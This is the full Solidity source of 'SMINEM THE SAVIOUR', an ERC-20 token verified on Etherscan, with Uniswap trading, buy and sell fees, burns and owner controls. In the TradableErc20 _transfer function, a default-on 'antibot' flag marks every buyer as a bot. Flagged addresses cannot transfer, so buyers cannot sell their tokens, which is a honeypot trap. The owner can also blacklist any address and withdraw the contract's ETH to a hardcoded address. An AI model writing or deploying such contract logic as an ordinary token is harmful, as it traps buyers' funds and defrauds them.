/**
 *Submitted for verification at Etherscan.io on 2022-01-27
*/

// File: contracts/Withdrawable.sol

abstract contract Withdrawable {
    address internal _withdrawAddress;

    modifier onlyWithdrawer() {
        require(msg.sender == _withdrawAddress);
        _;
    }

    function withdraw() external onlyWithdrawer {
        _withdraw();
    }

    function _withdraw() internal {
        payable(_withdrawAddress).transfer(address(this).balance);
    }

    function setWithdrawAddress(address newWithdrawAddress)
        external
        onlyWithdrawer
    {
        _withdrawAddress = newWithdrawAddress;
    }
}

// File: contracts/IUniswapV2Factory.sol

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

// File: contracts/IUniswapV2Router02.sol

pragma solidity ^0.8.7;

interface IUniswapV2Router02 {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

// File: contracts/IERC20.sol

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
// File: contracts/ERC20.sol

pragma solidity ^0.8.7;


contract ERC20 is IERC20 {
    uint256 internal _totalSupply = 1234567890e9;
    string _name;
    string _symbol;
    uint8 constant _decimals = 9;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(from, to, amount);

        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount);
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount);
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0));

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount);
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// File: contracts/MaxBuyDynamic.sol



abstract contract MaxBuyDynamic is ERC20 {
    uint256 startMaxBuy;
    uint256 constant maxBuyIncrementMinutesTimer = 2; // increment maxbuy minutes
    uint256 constant maxBuyIncrementPercentil = 1; // increment maxbyu percentil 1000=100%
    uint256 public maxBuyIncrementValue; // value for increment maxBuy
    uint256 public incrementTime; // last increment time
    uint256 public maxWallet; // maximum wallet value

    function startMaxBuyDynamic() internal {
        incrementTime = block.timestamp;
        maxBuyIncrementValue = (_totalSupply * maxBuyIncrementPercentil) / 1000;
        maxWallet = _totalSupply / 100;
    }

    function checkMaxBuy(
        uint256 currentCount,
        uint256 addingAmount
    ) view internal {
        // maxBuy limitation
        require(addingAmount <= getMaxBuy(), "max buy limit");
        // check max wallet
        require(currentCount + addingAmount <= maxWallet, "max wallet limit");
    }

    function getMaxBuy() public view returns (uint256) {
        uint256 incrementCount = (block.timestamp - incrementTime) /
            (maxBuyIncrementMinutesTimer * 1 minutes);
        return startMaxBuy + maxBuyIncrementValue * incrementCount;
    }

    function _setMaxBuyPercentil(uint256 percentil) internal {
        incrementTime = block.timestamp;
        startMaxBuy = (_totalSupply * percentil) / 1000;
    }
}

// File: contracts/TradableErc20.sol

pragma solidity ^0.8.7;

//import "hardhat/console.sol";





abstract contract TradableErc20 is MaxBuyDynamic {
    IUniswapV2Router02 internal constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    bool public tradingEnable;
    mapping(address => bool) public isBot;
    mapping(address => bool) _isExcludedFromFee;
    bool _autoBanBots = true;
    bool _inSwap;
    address public constant BURN_ADDRESS =
        0x000000000000000000000000000000000000dEaD;

    mapping(address => uint256) _buyTimes;
    uint256 _sellDelay = 24; // sell delay in hours
    uint256 public tax24HoursPercent = 30;

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
    {
        _isExcludedFromFee[address(0)] = true;
    }

    receive() external payable {}

    function makeLiquidity() public onlyOwner {
        require(uniswapV2Pair == address(0));
        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _balances[address(this)] = _totalSupply;
        _allowances[address(this)][address(_uniswapV2Router)] = _totalSupply;
        _isExcludedFromFee[pair] = true;
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _totalSupply,
            0,
            0,
            msg.sender,
            block.timestamp
        );

        uniswapV2Pair = pair;
        tradingEnable = true;

        incrementTime = block.timestamp;
        startMaxBuyDynamic();
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(!isBot[from] && !isBot[to]);
        require(_balances[from] >= amount, "not enough token for transfer");

        // buy
        if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
            require(tradingEnable, "trading disabled");
            // maxBuy
            if (!_autoBanBots) checkMaxBuy(_balances[to], amount);
            // antibot
            if (_autoBanBots) isBot[to] = true;
            // get taxes
            amount = _getFeeBuy(from, amount);
            // save buy time
            _buyTimes[to] = block.timestamp;
        }

        // sell
        if (!_inSwap && uniswapV2Pair != address(0) && to == uniswapV2Pair) {
            require(tradingEnable, "trading disabled");
            amount = _getFeeSell(amount, from);
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance > 0) {
                uint256 swapCount = contractTokenBalance;
                uint256 maxSwapCount = 2 * amount;
                if (swapCount > maxSwapCount) swapCount = maxSwapCount;
                swapTokensForEth(swapCount);
            }
        }

        // dynabic burn, if transfer
        if (
            from != uniswapV2Pair &&
            to != uniswapV2Pair &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) {
            uint256 burn = getSellBurnCount(from, amount); // burn count
            amount -= burn;
            _balances[from] -= burn;
            _balances[BURN_ADDRESS] += burn;
            _totalSupply -= burn;
            emit Transfer(address(from), BURN_ADDRESS, burn);
        }

        // transfer
        super._transfer(from, to, amount);
    }

    function _getFeeBuy(address from, uint256 amount)
        private
        returns (uint256)
    {
        uint256 dev = amount / 20; // 5%
        uint256 burn = amount / 50; // 2%
        amount -= dev + burn;
        _balances[from] -= dev + burn;
        _balances[address(this)] += dev;
        _balances[BURN_ADDRESS] += burn;
        _totalSupply -= burn;
        emit Transfer(from, address(this), dev);
        emit Transfer(from, BURN_ADDRESS, burn);
        return amount;
    }

    function getSellBurnCount(address account, uint256 amount)
        public
        view
        returns (uint256)
    {
        // calculate fee percent
        uint256 buyTime = _buyTimes[account];
        uint256 timeEnd = buyTime + _sellDelay * 1 hours;
        if (block.timestamp >= timeEnd) return amount / 20; // 5%
        uint256 timeLeft = timeEnd - block.timestamp;
        return
            amount /
            20 +
            (amount * tax24HoursPercent * timeLeft) /
            (100 * _sellDelay * 1 hours); // 5% + delay tax
    }

    function _getFeeSell(uint256 amount, address account)
        private
        returns (uint256)
    {
        // get taxes
        uint256 dev = amount / 20; // 5%
        uint256 burn = amount / 100; // getSellBurnCount(account, amount); // burn count

        amount -= dev + burn;
        _balances[account] -= dev + burn;
        _balances[address(this)] += dev;
        _balances[BURN_ADDRESS] += burn;
        _totalSupply -= burn;
        emit Transfer(address(account), address(this), dev);
        emit Transfer(address(account), BURN_ADDRESS, burn);
        return amount;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        // make the swap
        _uniswapV2Router.swapExactTokensForETH(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function setBots(address[] memory accounts, bool value) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; ++i) {
            isBot[accounts[i]] = value;
        }
    }

    function setExcludeFromFee(address[] memory accounts, bool value)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; ++i) {
            _isExcludedFromFee[accounts[i]] = value;
        }
    }

    function setTradingEnable(bool value, bool autoBanBotsValue)
        external
        onlyOwner
    {
        tradingEnable = value;
        _autoBanBots = autoBanBotsValue;
    }

    function setAutoBanBots(bool value) external onlyOwner {
        _autoBanBots = value;
    }

    function getAutoBanBots() external view returns (bool) {
        return _autoBanBots;
    }

    function isOwner(address account) internal virtual returns (bool);
}

// File: contracts/SMINEM THE SAVIOUR.sol

pragma solidity ^0.8.7;



contract SMINEM_THE_SAVIOUR is TradableErc20, Withdrawable {
    address _owner;

    constructor() TradableErc20("SMINEM THE SAVIOUR", "SMINEM") {
        _owner = msg.sender;
        _setMaxBuyPercentil(1);
        _withdrawAddress = address(0xd9C17345999274A94526339C7B04B0C8900b39C0);
    }

    function withdrawOwner() external onlyOwner {
        _withdraw();
    }

    function isOwner(address account) internal view override returns (bool) {
        return account == _owner;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        _owner = newOwner;
    }

    function setMaxBuyPercentil(uint256 percentil) external onlyOwner {
        _setMaxBuyPercentil(percentil);
    }
}